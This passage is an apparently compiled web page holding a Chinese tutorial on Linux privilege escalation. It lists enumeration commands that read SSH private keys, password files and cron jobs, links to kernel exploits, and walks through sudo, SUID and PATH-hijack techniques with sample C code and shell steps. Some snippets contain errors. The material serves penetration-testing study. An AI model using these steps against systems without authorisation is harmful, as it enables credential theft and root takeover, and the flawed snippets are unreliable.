import{_ as i}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as a,a as n,o as e}from"./app-DS0ZCcmM.js";const l="/articles/assets/labsetup-Blq4xLMo.png",t="/articles/assets/tarshell-B_S8SaD8.png",p="/articles/assets/ld_preload-CB7cyM7I.png",d="/articles/assets/lxd-setup-CEOSeAcg.png",r="/articles/assets/lxd-init-B-82ICaw.png",h="/articles/assets/lxc-ls-DxoEc9Wc.jpg",c="/articles/assets/lxd_rootv2-D3mQflYI.png",o="/articles/assets/docker-add-DlUDCKdT.png",k="/articles/assets/disk-key-C11tIP9w.png",u={};function g(b,s){return e(),a("div",null,s[0]||(s[0]=[n(`<h2 id="提权基础" tabindex="-1"><a class="header-anchor" href="#提权基础"><span>提权基础</span></a></h2><p>权限提升在渗透测试中是必不可少的环节，为了得到更高的权限，攻击者可以利用各式各样的工具，漏洞来进行权限的提升</p><h3 id="用户权限" tabindex="-1"><a class="header-anchor" href="#用户权限"><span>用户权限</span></a></h3><p>在Linux中一个文件有3种权限。对文件而言用户有3种不同类型：文件所有者、群组用户、其他用户。例如：chmod 777中，三个数字7分别对应上面三种用户，权限值都为7。</p><ul><li>文件权限： <ul><li>r 只读</li><li>w 只写</li><li>x 执行</li></ul></li></ul><p>高权限可进一步利用的方法：</p><ol><li>重置其他账户密码访问其他账户权限文件</li><li>绕过访问控制的权限操作数据内容</li><li>更改软件的配置</li><li>实现持久化</li><li>更改对应用户权限</li></ol><p>提取的大致思路：利用sudo等命令进行提权，利用工具/框架/系统漏洞进行提权</p><h2 id="linux提权" tabindex="-1"><a class="header-anchor" href="#linux提权"><span>LINUX提权</span></a></h2><h3 id="提权信息的收集" tabindex="-1"><a class="header-anchor" href="#提权信息的收集"><span>提权信息的收集</span></a></h3><p>目的在于寻找可以利用的工具，命令，了解版本信息为搜寻系统漏洞做准备</p><h4 id="设备-系统信息" tabindex="-1"><a class="header-anchor" href="#设备-系统信息"><span>设备，系统信息</span></a></h4><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>uname -a    打印所有可用的系统信息</span></span>
<span class="line"><span>uname -r    内核版本</span></span>
<span class="line"><span>uname -n    系统主机名。</span></span>
<span class="line"><span>uname -m    查看系统内核架构（64位/32位）</span></span>
<span class="line"><span>hostname    系统主机名</span></span>
<span class="line"><span>cat /proc/version    内核信息</span></span>
<span class="line"><span>cat /etc/*-release   分发信息</span></span>
<span class="line"><span>cat /etc/issue       分发信息</span></span>
<span class="line"><span>cat /proc/cpuinfo    CPU信息</span></span>
<span class="line"><span>cat /etc/lsb-release # Debian </span></span>
<span class="line"><span>cat /etc/redhat-release # Redhat</span></span>
<span class="line"><span>ls /boot | grep vmlinuz-</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="用户-组信息" tabindex="-1"><a class="header-anchor" href="#用户-组信息"><span>用户，组信息</span></a></h4><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>cat /etc/passwd     列出系统上的所有用户</span></span>
<span class="line"><span>cat /var/mail/root</span></span>
<span class="line"><span>cat /var/spool/mail/root</span></span>
<span class="line"><span>cat /etc/group      列出系统上的所有组</span></span>
<span class="line"><span>grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &#39;$3 == 0 { print $1}&#39;      列出所有的超级用户账户</span></span>
<span class="line"><span>whoami              查看当前用户</span></span>
<span class="line"><span>w                   谁目前已登录，他们正在做什么</span></span>
<span class="line"><span>last                最后登录用户的列表</span></span>
<span class="line"><span>lastlog             所有用户上次登录的信息</span></span>
<span class="line"><span>lastlog –u %username%  有关指定用户上次登录的信息</span></span>
<span class="line"><span>lastlog |grep -v &quot;Never&quot;  以前登录用户的完</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>/etc/passwd信息可用于添加root权限用户进行提权</p><h4 id="用户权限信息" tabindex="-1"><a class="header-anchor" href="#用户权限信息"><span>用户权限信息</span></a></h4><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>whoami  当前用户用户名</span></span>
<span class="line"><span>id  	当前用户信息</span></span>
<span class="line"><span>cat /etc/sudoers  谁被允许以root身份执行</span></span>
<span class="line"><span>sudo -l       当前用户可以以root身份执行的操作</span></span>
<span class="line"><span>find / -perm -u=s -type f 2&gt;/dev/null   #寻找能以root用户执行的二进制文件</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>sudo -l命令与find / -perm -u=s -type f 2&gt;/dev/null命令类似，前者需要sudo权限，后者不需要，但是需要find命令存在</p><p>id不能查看自己的信息，以id username 的形式也能看到别人的信息</p><h4 id="系统环境变量信息" tabindex="-1"><a class="header-anchor" href="#系统环境变量信息"><span>系统环境变量信息</span></a></h4><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>env 显示环境变量</span></span>
<span class="line"><span>set 现实环境变量</span></span>
<span class="line"><span>echo %PATH 路径信息</span></span>
<span class="line"><span>history 显示当前用户的历史命令记录</span></span>
<span class="line"><span>pwd 输出工作目录</span></span>
<span class="line"><span>cat /etc/profile 显示默认系统变量</span></span>
<span class="line"><span>cat /etc/shells 显示可用的shell</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="进程和服务信息" tabindex="-1"><a class="header-anchor" href="#进程和服务信息"><span>进程和服务信息</span></a></h4><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>ps aux</span></span>
<span class="line"><span>ps -ef</span></span>
<span class="line"><span>top</span></span>
<span class="line"><span>cat /etc/services</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="服务和插件" tabindex="-1"><a class="header-anchor" href="#服务和插件"><span>服务和插件</span></a></h4><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>cat /etc/syslog.conf</span></span>
<span class="line"><span>cat /etc/chttp.conf</span></span>
<span class="line"><span>cat /etc/lighttpd.conf</span></span>
<span class="line"><span>cat /etc/cups/cupsd.conf</span></span>
<span class="line"><span>cat /etc/inetd.conf</span></span>
<span class="line"><span>cat /etc/apache2/apache2.conf</span></span>
<span class="line"><span>cat /etc/my.conf</span></span>
<span class="line"><span>cat /etc/httpd/conf/httpd.conf</span></span>
<span class="line"><span>cat /opt/lampp/etc/httpd.conf</span></span>
<span class="line"><span>ls -aRl /etc/ | awk &#39;$1 ~ /^.*r.*/</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="计划任务" tabindex="-1"><a class="header-anchor" href="#计划任务"><span>计划任务</span></a></h4><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>crontab -l</span></span>
<span class="line"><span>ls -alh /var/spool/cron</span></span>
<span class="line"><span>ls -al /etc/ | grep cron</span></span>
<span class="line"><span>ls -al /etc/cron*</span></span>
<span class="line"><span>cat /etc/cron*</span></span>
<span class="line"><span>cat /etc/at.allow</span></span>
<span class="line"><span>cat /etc/at.deny</span></span>
<span class="line"><span>cat /etc/cron.allow</span></span>
<span class="line"><span>cat /etc/cron.deny</span></span>
<span class="line"><span>cat /etc/crontab</span></span>
<span class="line"><span>cat /etc/anacrontab</span></span>
<span class="line"><span>cat /var/spool/cron/crontabs/root</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="明文密码" tabindex="-1"><a class="header-anchor" href="#明文密码"><span>明文密码</span></a></h4><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>grep -i user [filename]</span></span>
<span class="line"><span>grep -i pass [filename]</span></span>
<span class="line"><span>grep -C 5 &quot;password&quot; [filename]</span></span>
<span class="line"><span>find , -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="ssh私钥信息" tabindex="-1"><a class="header-anchor" href="#ssh私钥信息"><span>ssh私钥信息</span></a></h4><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>cat ~/.ssh/authorized_keys</span></span>
<span class="line"><span>cat ~/.ssh/identity.pub</span></span>
<span class="line"><span>cat ~/.ssh/identity</span></span>
<span class="line"><span>cat ~/.ssh/id_rsa.pub</span></span>
<span class="line"><span>cat ~/.ssh/id_rsa</span></span>
<span class="line"><span>cat ~/.ssh/id_dsa.pub</span></span>
<span class="line"><span>cat ~/.ssh/id_dsa</span></span>
<span class="line"><span>cat /etc/ssh/ssh_config</span></span>
<span class="line"><span>cat /etc/ssh/sshd_config</span></span>
<span class="line"><span>cat /etc/ssh/ssh_host_dsa_key.pub</span></span>
<span class="line"><span>cat /etc/ssh/ssh_host_dsa_key</span></span>
<span class="line"><span>cat /etc/ssh/ssh_host_rsa_key.pub</span></span>
<span class="line"><span>cat /etc/ssh/ssh_host_rsa_key</span></span>
<span class="line"><span>cat /etc/ssh/ssh_host_key.pub</span></span>
<span class="line"><span>cat /etc/ssh/ssh_host_key</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="查看与主机通信的信息" tabindex="-1"><a class="header-anchor" href="#查看与主机通信的信息"><span>查看与主机通信的信息</span></a></h4><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>lsof -i</span></span>
<span class="line"><span>lsof -i :80</span></span>
<span class="line"><span>grep 80 /etc/services</span></span>
<span class="line"><span>netstat -anptl</span></span>
<span class="line"><span>netstat -antup</span></span>
<span class="line"><span>netstat -antpx</span></span>
<span class="line"><span>netstat -tulpn</span></span>
<span class="line"><span>chkconfig --list</span></span>
<span class="line"><span>chkconfig --list | grep 3:on</span></span>
<span class="line"><span>last</span></span>
<span class="line"><span>w</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>netstat</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>可以查看现有的连接信息</p><ul><li>利用<code>netstat -at</code>和<code>netstat -au</code>可以分别显示tcp和udp协议的连接</li><li>利用<code>netstat -l</code>可以以<code>Listen</code>列出端口</li></ul></li></ul><h4 id="查看可提权的suid或guid" tabindex="-1"><a class="header-anchor" href="#查看可提权的suid或guid"><span>查看可提权的SUID或GUID</span></a></h4><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>find / -perm -1000 -type d 2&gt;/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.</span></span>
<span class="line"><span>find / -perm -g=s -type f 2&gt;/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.</span></span>
<span class="line"><span>find / -perm -u=s -type f 2&gt;/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.</span></span>
<span class="line"><span></span></span>
<span class="line"><span>    # SGID or SUID</span></span>
<span class="line"><span>for i in \`locate -r &quot;bin$&quot;\`; do find $i \\( -perm -4000 -o -perm -2000 \\) -type f 2&gt;/dev/null; done    # Looks in &#39;common&#39; places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)</span></span>
<span class="line"><span></span></span>
<span class="line"><span># find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)</span></span>
<span class="line"><span>find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \\; 2&gt;/dev/null</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="查看可写-执行目录" tabindex="-1"><a class="header-anchor" href="#查看可写-执行目录"><span>查看可写/执行目录</span></a></h4><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>find / -writable -type d 2&gt;/dev/null      # world-writeable folders</span></span>
<span class="line"><span>find / -perm -222 -type d 2&gt;/dev/null     # world-writeable folders</span></span>
<span class="line"><span>find / -perm -o w -type d 2&gt;/dev/null     # world-writeable folders</span></span>
<span class="line"><span></span></span>
<span class="line"><span>find / -perm -o x -type d 2&gt;/dev/null     # world-executable folders</span></span>
<span class="line"><span></span></span>
<span class="line"><span>find / \\( -perm -o w -perm -o x \\) -type d 2&gt;/dev/null   # world-writeable &amp; executable folders</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="提权方法" tabindex="-1"><a class="header-anchor" href="#提权方法"><span>提权方法</span></a></h3><h4 id="linux内核漏洞提权" tabindex="-1"><a class="header-anchor" href="#linux内核漏洞提权"><span>linux内核漏洞提权</span></a></h4><p><strong>CVE-2016-5195 脏牛提权漏洞(Dirtycow)</strong></p><p>影响版本： linux kernel &gt;=2.6.22</p><p>漏洞原理：在Linux内核的内存子系统处理私有只读内存映射的写时复制（COW）损坏的方式中发现了一种竞争状况。一个没有特权的本地用户可以使用此漏洞来获取对只读存储器映射的写访问权，从而增加他们在系统上的特权。</p><p>提权利用：</p><ul><li><a href="https://github.com/dirtycow/dirtycow.github.io" target="_blank" rel="noopener noreferrer">https://github.com/dirtycow/dirtycow.github.io</a></li><li><a href="https://github.com/gbonacini/CVE-2016-5195" target="_blank" rel="noopener noreferrer">https://github.com/gbonacini/CVE-2016-5195</a></li><li><a href="https://github.com/FireFart/dirtycow" target="_blank" rel="noopener noreferrer">https://github.com/FireFart/dirtycow</a></li><li><a href="https://github.com/Rvn0xsy/reverse_dirty" target="_blank" rel="noopener noreferrer">https://github.com/Rvn0xsy/reverse_dirty</a></li></ul><p>exp位置：<a href="https://www.exploit-db.com/exploits/40847" target="_blank" rel="noopener noreferrer">https://www.exploit-db.com/exploits/40847</a></p><p><strong>CVE-2019-13272</strong></p><p>影响版本：LINUX 4.10 &lt; 5.1.17</p><ul><li><a href="https://github.com/oneoy/CVE-2019-13272" target="_blank" rel="noopener noreferrer">https://github.com/oneoy/CVE-2019-13272</a></li><li><a href="https://github.com/Huandtx/CVE-2019-13272" target="_blank" rel="noopener noreferrer">https://github.com/Huandtx/CVE-2019-13272</a></li><li><a href="https://github.com/icecliffs/Linux-For-Root" target="_blank" rel="noopener noreferrer">https://github.com/icecliffs/Linux-For-Root</a></li></ul><p><strong>CVE-2017-16995</strong></p><ul><li><a href="https://github.com/oneoy/CVE-2019-13272" target="_blank" rel="noopener noreferrer">https://github.com/oneoy/CVE-2019-13272</a></li><li><a href="https://github.com/Huandtx/CVE-2019-13272" target="_blank" rel="noopener noreferrer">https://github.com/Huandtx/CVE-2019-13272</a></li><li><a href="https://github.com/icecliffs/Linux-For-Root" target="_blank" rel="noopener noreferrer">https://github.com/icecliffs/Linux-For-Root</a></li></ul><p><strong>CVE-2019-14287</strong></p><ul><li><a href="https://github.com/Twinkeer/CVE" target="_blank" rel="noopener noreferrer">https://github.com/Twinkeer/CVE</a></li></ul><p><strong>linux内核漏洞提权汇总</strong></p><p><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener noreferrer">https://github.com/SecWiki/linux-kernel-exploits</a></p><h4 id="sudo提权" tabindex="-1"><a class="header-anchor" href="#sudo提权"><span>sudo提权</span></a></h4><p>原理：普通用户在使用sudo执行命令的过程中，会暂时拥有root权限，如果该命令执行没有中断，而且该命令运行的过程中可以调用系统命令，那就可以直接运行/bin/bash，此时就是在root权限下运行bash了</p><p>配置文件:sudoers(在该目录中的用户拥有sudo的权限，是否需要输入密码取决于个人设置)</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>sudo -l</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>查询当前用户能够以sudo权限利用的工具，同时可能会遇到连sudo -l都无法执行的情况，这时候就需要考虑其他路线了</p><p>当得到当前用户能够以sudo权限执行的工具时，在<a href="https://gtfobins.github.io/%E4%B8%8A%E6%90%9C%E7%B4%A2%E5%AF%B9%E5%BA%94%E6%8F%90%E6%9D%83%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8%E5%8D%B3%E5%8F%AF" target="_blank" rel="noopener noreferrer">https://gtfobins.github.io/上搜索对应提权命令使用即可</a></p><p>CVE-2019-14287影响sudo&lt;1.8.23</p><p><strong>su与su -的区别</strong></p><p>su ==&gt;切换到root用户，但shell环境仍然是普通用户的shell</p><p>su - ==&gt;切换到root用户，并且shell环境也一并切换，工作目录为root用户</p><h4 id="suid提权" tabindex="-1"><a class="header-anchor" href="#suid提权"><span>SUID提权</span></a></h4><p>概念：SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。SUID可以让调用者以文件拥有者的身份运行该文件，通过调用root用户所拥有的suid文件，运行时我们就获得了root权限</p><p><strong>为什么这些文件可以有root权限</strong></p><p>例如ping工具，ping需要发送icmp报文，而发送该报文需要发送Raw Socket，在引入CAPABILITIES之前，该操作需要root权限，所以赋予了普通用户使用ping工具时所需要的root权限，类似的还有exim等</p><p><strong>在本地寻找suid文件</strong></p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>find / -user root -perm -4000 -print 2&gt;/dev/null</span></span>
<span class="line"><span>find / -perm -u=s -type f 2&gt;/dev/null</span></span>
<span class="line"><span>find / -user root -perm -4000 -exec ls -ldb {} ;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>常见可用于提权的程序</strong></p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>nmap vim find Bash More Less Nano cp netcat exim</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><strong>推荐工具</strong></p><p><a href="https://github.com/Jewel591/suidcheck" target="_blank" rel="noopener noreferrer">https://github.com/Jewel591/suidcheck</a></p><p>该工具用于自动寻找可用于suid提权的程序，并给出相应的提权方法与参考文章</p><p><strong>参考链接</strong></p><p><a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html#reply" target="_blank" rel="noopener noreferrer">https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html#reply</a></p><h4 id="环境变量提权" tabindex="-1"><a class="header-anchor" href="#环境变量提权"><span>环境变量提权</span></a></h4><p>提权的关键在于，寻找到suid权限的脚本文件，环境变量中有自己能够控制的路径，并且脚本中需要有setuid(),setgid()的操作，可以进行一下测试</p><p>当前目录为/home/uu2fu3o/script/</p><p>写两个shell文件</p><div class="language-c line-numbers-mode" data-highlighter="shiki" data-ext="c" data-title="c" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">shell1.c</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">========</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">#include</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&lt;unistd.h&gt;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">void</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> main</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> setuid</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> setgid</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> system</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;ps&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">shell2.c</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">#include</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&lt;unistd.c&gt;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">void</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> main</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">    setgid</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">    system</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;ps&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>分别使用gcc进行编译</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>gcc shell1.c -o shell1 </span></span>
<span class="line"><span>gcc shell2.c -o shell2</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>分别赋予两个脚本文件suid权限</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>chmod u+s shell1/shell2</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>cd /tmp</span></span>
<span class="line"><span>echo &quot;/bin/bash&quot; &gt; ps</span></span>
<span class="line"><span>chmod 777 ps</span></span>
<span class="line"><span>echo $PATH</span></span>
<span class="line"><span>export PATH=/tmp:$PATH</span></span>
<span class="line"><span>cd /home/uu2fu3o/script</span></span>
<span class="line"><span>./shell</span></span>
